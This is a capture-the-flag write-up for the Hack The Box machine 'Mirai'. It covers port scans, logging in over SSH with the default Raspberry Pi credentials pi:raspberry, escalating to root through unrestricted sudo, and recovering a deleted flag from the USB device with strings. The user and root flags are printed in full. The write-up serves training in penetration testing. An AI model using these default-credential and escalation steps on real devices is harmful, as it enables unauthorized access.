---
description: 10.10.10.48
---

# Mirai

![](<../../.gitbook/assets/1 (5).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Lots of rabbit holes. Use default SSH creds for pi-hole to get a shell
* Root - Sudo ALL (sudo bash)

## Enumeration:

All the enumeration output shown below was gathered using "autorecon". For more information about this tool checkout the following page:

{% embed url="https://github.com/Tib3rius/AutoRecon" %}

### Nmap

Quick TCP nmap scan results:

```
Nmap scan report for 10.10.10.48
Host is up, received user-set (0.026s latency).
Scanned at 2021-11-15 11:08:27 EST for 25s
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJpzaaGcmwdVrkG//X5kr6m9em2hEu3SianCnerFwTGHgUHrRpR6iocVhd8gN21TPNTwFF47q8nUitupMBnvImwAs8NcjLVclPSdFJSWwTxbaBiXOqyjV5BcKty+s2N8I9neI2coRBtZDUwUiF/1gUAZIimeKOj2x39kcBpcpM6ZAAAAFQDwL9La/FPu1rEutE8yfdIgxTDDNQAAAIBJbfYW/IeOFHPiKBzHWiM8JTjhPCcvjIkNjKMMdS6uo00/JQH4VUUTscc/LTvYmQeLAyc7GYQ/AcLgoYFHm8hDgFVN2D4BQ7yGQT9dU4GAOp4/H1wHPKlAiBuDQMsyEk2s2J+60Rt+hUKCZfnxPOoD9l+VEWfZQYCTOBi3gOAotgAAAIBd6OWkakYL2e132lg6Z02202PIq9zvAx3tfViuU9CGStiIW4eH4qrhSMiUKrhbNeCzvdcw6pRWK41+vDiQrhV12/w6JSowf9KHxvoprAGiEg7GjyvidBr9Mzv1WajlU9BQO0Nc7poV2UzyMwLYLqzdjBJT28WUs3qYTxanaUrV9g==
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpSoRAKB+cPR8bChDdajCIpf4p1zHfZyu2xnIkqRAgm6Dws2zcy+VAZriPDRUrht10GfsBLZtp/1PZpkUd2b1PKvN2YIg4SDtpvTrdwAM2uCgUrZdKRoFa+nd8REgkTg8JRYkSGQ/RxBZzb06JZhRSvLABFve3rEPVdwTf4mzzNuryV4DNctrAojjP4Sq7Msc24poQRG9AkeyS1h4zrZMbB0DQaKoyY3pss5FWJ+qa83XNsqjnKlKhSbjH17pBFhlfo/6bGkIE68vS5CQi9Phygke6/a39EP2pJp6WzT5KI3Yosex3Br85kbh/J8CVf4EDIRs5qismW+AZLeJUJHrj
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCl89gWp+rA+2SLZzt3r7x+9sXFOCy9g3C9Yk1S21hT/VOmlqYys1fbAvqwoVvkpRvHRzbd5CxViOVih0TeW/bM=
|   256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvYtCvO/UREAhODuSsm7liSb9SZ8gLoZtn7P46SIDZL
53/tcp   open  domain  syn-ack ttl 63 dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp   open  http    syn-ack ttl 63 lighttpd 1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: lighttpd/1.4.35
1102/tcp open  upnp    syn-ack ttl 63 Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 15 11:08:52 2021 -- 1 IP address (1 host up) scanned in 32.43 seconds
```

Full TCP nmap scan results:

```
Nmap scan report for 10.10.10.48
Host is up, received user-set (0.016s latency).
Scanned at 2021-11-15 11:08:27 EST for 66s
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJpzaaGcmwdVrkG//X5kr6m9em2hEu3SianCnerFwTGHgUHrRpR6iocVhd8gN21TPNTwFF47q8nUitupMBnvImwAs8NcjLVclPSdFJSWwTxbaBiXOqyjV5BcKty+s2N8I9neI2coRBtZDUwUiF/1gUAZIimeKOj2x39kcBpcpM6ZAAAAFQDwL9La/FPu1rEutE8yfdIgxTDDNQAAAIBJbfYW/IeOFHPiKBzHWiM8JTjhPCcvjIkNjKMMdS6uo00/JQH4VUUTscc/LTvYmQeLAyc7GYQ/AcLgoYFHm8hDgFVN2D4BQ7yGQT9dU4GAOp4/H1wHPKlAiBuDQMsyEk2s2J+60Rt+hUKCZfnxPOoD9l+VEWfZQYCTOBi3gOAotgAAAIBd6OWkakYL2e132lg6Z02202PIq9zvAx3tfViuU9CGStiIW4eH4qrhSMiUKrhbNeCzvdcw6pRWK41+vDiQrhV12/w6JSowf9KHxvoprAGiEg7GjyvidBr9Mzv1WajlU9BQO0Nc7poV2UzyMwLYLqzdjBJT28WUs3qYTxanaUrV9g==
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpSoRAKB+cPR8bChDdajCIpf4p1zHfZyu2xnIkqRAgm6Dws2zcy+VAZriPDRUrht10GfsBLZtp/1PZpkUd2b1PKvN2YIg4SDtpvTrdwAM2uCgUrZdKRoFa+nd8REgkTg8JRYkSGQ/RxBZzb06JZhRSvLABFve3rEPVdwTf4mzzNuryV4DNctrAojjP4Sq7Msc24poQRG9AkeyS1h4zrZMbB0DQaKoyY3pss5FWJ+qa83XNsqjnKlKhSbjH17pBFhlfo/6bGkIE68vS5CQi9Phygke6/a39EP2pJp6WzT5KI3Yosex3Br85kbh/J8CVf4EDIRs5qismW+AZLeJUJHrj
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCl89gWp+rA+2SLZzt3r7x+9sXFOCy9g3C9Yk1S21hT/VOmlqYys1fbAvqwoVvkpRvHRzbd5CxViOVih0TeW/bM=
|   256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvYtCvO/UREAhODuSsm7liSb9SZ8gLoZtn7P46SIDZL
53/tcp    open  domain  syn-ack ttl 63 dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    syn-ack ttl 63 lighttpd 1.4.35
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: lighttpd/1.4.35
1102/tcp  open  upnp    syn-ack ttl 63 Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    syn-ack ttl 63 Plex Media Server httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Unauthorized
|_http-favicon: Plex
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
32469/tcp open  upnp    syn-ack ttl 63 Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/15%OT=22%CT=1%CU=34780%PV=Y%DS=2%DC=T%G=Y%TM=619286
OS:3D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SE
OS:Q(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=8)OPS(O1=M54DST11NW6%O2=M54DST11NW6%
OS:O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11NW6%O6=M54DST11)WIN(W1=7120%W2
OS:=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNS
OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.077 days (since Mon Nov 15 09:19:01 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   16.16 ms 10.10.14.1
2   16.27 ms 10.10.10.48

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 15 11:09:33 2021 -- 1 IP address (1 host up) scanned in 73.34 seconds
```

### Whatweb

```
WhatWeb report for http://10.10.10.48:80
Status    : 404 Not Found
Title     : <None>
IP        : 10.10.10.48
Country   : RESERVED, ZZ

Summary   : HTTPServer[lighttpd/1.4.35], UncommonHeaders[x-pi-hole], lighttpd[1.4.35]

Detected Plugins:
[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	String       : lighttpd/1.4.35 (from server string)

[ UncommonHeaders ]
	Uncommon HTTP server headers. The blacklist includes all 
	the standard headers and many non standard but common ones. 
	Interesting but fairly common headers should have their own 
	plugins, eg. x-powered-by, server and x-aspnet-version. 
	Info about headers can be found at www.http-stats.com 

	String       : x-pi-hole (from headers)

[ lighttpd ]
	Lightweight open-source web server. 

	Version      : 1.4.35
	Website     : http://www.lighttpd.net/

HTTP Headers:
	HTTP/1.1 404 Not Found
	X-Pi-hole: A black hole for Internet advertisements.
	Content-type: text/html; charset=UTF-8
	Content-Length: 0
	Connection: close
	Date: Mon, 15 Nov 2021 16:11:02 GMT
	Server: lighttpd/1.4.35
	

```

```
WhatWeb report for http://10.10.10.48:32400
Status    : 401 Unauthorized
Title     : Unauthorized
IP        : 10.10.10.48
Country   : RESERVED, ZZ

Summary   : UncommonHeaders[x-plex-protocol,x-plex-content-original-length,x-plex-content-compressed-length], Script

Detected Plugins:
[ Script ]
	This plugin detects instances of script HTML elements and 
	returns the script language/type. 


[ UncommonHeaders ]
	Uncommon HTTP server headers. The blacklist includes all 
	the standard headers and many non standard but common ones. 
	Interesting but fairly common headers should have their own 
	plugins, eg. x-powered-by, server and x-aspnet-version. 
	Info about headers can be found at www.http-stats.com 

	String       : x-plex-protocol,x-plex-content-original-length,x-plex-content-compressed-length (from headers)

HTTP Headers:
	HTTP/1.1 401 Unauthorized
	Content-Type: text/html
	X-Plex-Protocol: 1.0
	Content-Encoding: gzip
	X-Plex-Content-Original-Length: 193
	X-Plex-Content-Compressed-Length: 157
	Content-Length: 157
	Cache-Control: no-cache
	Date: Mon, 15 Nov 2021 16:11:41 GMT
	

```

### Nikto

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.48
+ Target Hostname:    10.10.10.48
+ Target Port:        80
+ Start Time:         2021-11-15 11:08:53 (GMT-5)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.35
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-pi-hole' found, with contents: A black hole for Internet advertisements.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ 7862 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-11-15 11:13:25 (GMT-5) (272 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.48
+ Target Hostname:    10.10.10.48
+ Target Port:        32400
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=US/ST=CA/L=Los Gatos/O=Plex, Inc./CN=*.78063b2b367a4a389895262d75b0b03c.plex.direct
                   Ciphers:  ECDHE-RSA-AES128-GCM-SHA256
                   Issuer:   /C=US/O=Plex, Inc./CN=Plex Devices High Assurance CA2
+ Start Time:         2021-11-15 11:09:34 (GMT-5)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-plex-protocol' found, with contents: 1.0
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ /clientaccesspolicy.xml contains a full wildcard entry. See http://msdn.microsoft.com/en-us/library/cc197955(v=vs.95).aspx
+ /clientaccesspolicy.xml contains 12 lines which should be manually viewed for improper domains or wildcards.
+ /crossdomain.xml contains a full wildcard entry. See http://jeremiahgrossman.blogspot.com/2008/05/crossdomainxml-invites-cross-site.html
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Plex Media Server
+ Uncommon header 'x-plex-content-original-length' found, with contents: 193
+ Uncommon header 'x-plex-content-compressed-length' found, with contents: 157
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Server is using a wildcard certificate: *.78063b2b367a4a389895262d75b0b03c.plex.direct
+ Hostname '10.10.10.48' does not match certificate's names: *.78063b2b367a4a389895262d75b0b03c.plex.direct
+ Retrieved access-control-allow-origin header: *
+ /webmail/: Web based mail package installed.
+ OSVDB-3092: /web800fo/: This might be interesting...
+ OSVDB-3092: /webaccess.htm: This might be interesting...
+ OSVDB-3092: /webadmin/: This might be interesting...may be HostingController, www.hostingcontroller.com
+ OSVDB-3092: /webboard/: This might be interesting...
+ OSVDB-3092: /webcart-lite/: This might be interesting...
+ OSVDB-3092: /webcart/: This might be interesting...
+ OSVDB-3092: /webdata/: This might be interesting...
+ OSVDB-3092: /weblog/: This might be interesting...
+ OSVDB-3092: /weblogs/: This might be interesting...
+ OSVDB-3092: /webmaster_logs/: This might be interesting...
+ OSVDB-3092: /website/: This might be interesting...
+ OSVDB-3092: /webstats/: This might be interesting...
+ OSVDB-3092: /manager/: May be a web server or site manager.
+ OSVDB-32333: /webcache/: Oracle WebCache Demo
+ /webadmin.asp: Admin login page/section found.
+ /webadmin.html: Admin login page/section found.
+ /webadmin.php: Admin login page/section found.
+ /webmaster/: Admin login page/section found.
+ /websvn/: Admin login page/section found.
+ /webservices/: Webservices found
+ /identity: Encryption key exposed
+ /web.txt: This might be interesting...
+ 8673 requests: 0 error(s) and 39 item(s) reported on remote host
+ End Time:           2021-11-15 11:24:16 (GMT-5) (882 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Gobuster

```
/_framework/blazor.webassembly.js (Status: 200) [Size: 61]
/admin (Status: 301) [Size: 0]
/swfobject.js (Status: 200) [Size: 61]
```

## Website exploration

#### Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* TCP 80 is running a pi-hole v 3.1.4
* TCP 32400 is running a Plex media server
* No information leakage found in either of the two sites

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing found in the scripts​

## Gaining Access

A google search for "pi-hole default creds"​ ​fnds the following page:

{% embed url="https://www.reddit.com/r/pihole/comments/6eqyw4/pihole_ssh_login" %}

One of the responses confirms the default creds as:

> pi:raspberry

Using these creds, we can SSH to the target and grab the user flag.

```
└─$ ssh pi@10.10.10.48
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ pwd
/home/pi
pi@raspberrypi:~ $ ls -l
total 1440
-rw-r--r-- 1 pi pi 1441764 Aug 13  2017 background.jpg
drwxr-xr-x 3 pi pi    4096 Aug 13  2017 Desktop
drwxr-xr-x 5 pi pi      99 Dec 13  2016 Documents
drwxr-xr-x 2 pi pi    4096 Aug 13  2017 Downloads
drwxr-xr-x 2 pi pi    4096 Aug 13  2017 Music
drwxr-xr-x 3 pi pi    4096 Aug 13  2017 oldconffiles
drwxr-xr-x 2 pi pi    4096 Aug 13  2017 Pictures
drwxr-xr-x 2 pi pi    4096 Aug 13  2017 Public
drwxr-xr-x 2 pi pi    1629 Dec 13  2016 python_games
drwxr-xr-x 2 pi pi    4096 Aug 13  2017 Templates
drwxr-xr-x 2 pi pi    4096 Aug 13  2017 Videos
pi@raspberrypi:~ $ cd ..
pi@raspberrypi:/home $ ls -la
total 12
drwxr-xr-x  4 root root 4096 Aug 13  2017 .
drwxr-xr-x 35 root root 4096 Aug 14  2017 ..
drwxr-xr-x 21 pi   pi   4096 Nov 16 08:49 pi
pi@raspberrypi:/home $ cd ..
pi@raspberrypi:/ $ find / -name user.txt 2>/dev/null
/home/pi/Desktop/user.txt
/lib/live/mount/persistence/sda2/home/pi/Desktop/user.txt
pi@raspberrypi:/ $ cat /lib/live/mount/persistence/sda2/home/pi/Desktop/user.txt
ff837707441b257a20e32199d7c8838dpi@raspberrypi:/ $ 
pi@raspberrypi:/ $ cat /home/pi/Desktop/user.txt
ff837707441b257a20e32199d7c8838dpi@raspberrypi:/ $ 

```

## Privilege Escalation

Let's see if the user "pi" can run any commands as another user:

```
pi@raspberrypi:/ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:/ $ sudo bash
root@raspberrypi:/# id
uid=0(root) gid=0(root) groups=0(root)

```

## Find the root flag

We can escalate privileges to root, but when we try and grab the root flag, we see the following:

```
root@raspberrypi:~# cat root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
root@raspberrypi:~#
```

Let's check the USB stick reffered to in the note:

```
root@raspberrypi:/# cd media/
root@raspberrypi:/media# ls -la
total 9
drwxr-xr-x  3 root root 4096 Aug 14  2017 .
drwxr-xr-x 35 root root 4096 Aug 14  2017 ..
drwxr-xr-x  3 root root 1024 Aug 14  2017 usbstick
root@raspberrypi:/media# cd usbstick/
root@raspberrypi:/media/usbstick# ls -la
total 18
drwxr-xr-x 3 root root  1024 Aug 14  2017 .
drwxr-xr-x 3 root root  4096 Aug 14  2017 ..
-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
drwx------ 2 root root 12288 Aug 14  2017 lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
root@raspberrypi:/media/usbstick#
```

Another dead end. Looks like we need to do some sort of file recovery here.

{% embed url="https://en.wikipedia.org/wiki/Everything_is_a_file" %}

One important thing to remember when it comes to \*NIX systems is that pretty much everything is a represented by a file, and this includes devices.

{% embed url="https://en.wikipedia.org/wiki/Device_file" %}

Let's list the devices on the system:

```
root@raspberrypi:/# lsblk -f
NAME   FSTYPE   LABEL                        UUID                                 MOUNTPOINT
sda    iso9660  Debian jessie 20161213-13:58 2016-12-13-15-39-36-00               
├─sda1 iso9660  Debian jessie 20161213-13:58 2016-12-13-15-39-36-00               /lib/live/mount/persistence/sda1
└─sda2 ext4     persistence                  9a4604f7-d480-4c02-8332-ad0fc1916032 /lib/live/mount/persistence/sda2
sdb    ext4                                  635bcd7f-1d95-4229-bf13-3e722026db3c /media/usbstick
sr0                                                                               
loop0  squashfs                                                                   /lib/live/mount/rootfs/filesyste
root@raspberrypi:/# ls -la /media/usbstick/
total 18
drwxr-xr-x 3 root root  1024 Aug 14  2017 .
drwxr-xr-x 3 root root  4096 Aug 14  2017 ..
-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
drwx------ 2 root root 12288 Aug 14  2017 lost+found
root@raspberrypi:/#
```

A  quick google search for " " finds the following page:

{% embed url="https://unix.stackexchange.com/questions/80270/unix-linux-undelete-recover-deleted-files" %}

Using the "grep" command, we can read text from the device file. Note that there is alot of unreadable characters in the output, and so below I've removed them and left just the flag and some other text.

```
root@raspberrypi:/# grep -a -C 200 -F 'root.txt' /dev/sdb
...[TRUNCATED]
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James

root@raspberrypi:/# echo '3d3e483143ff12ec505d026fa13e020b' | wc -c
33
root@raspberrypi:/#
```

Since we are only interested in recovering text, a better way to do this is to use "strings", which will only return the text that it reads from the device file:

```
root@raspberrypi:/# strings /dev/sdb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
root@raspberrypi:/# 

```



## Resources

​ ​ ​
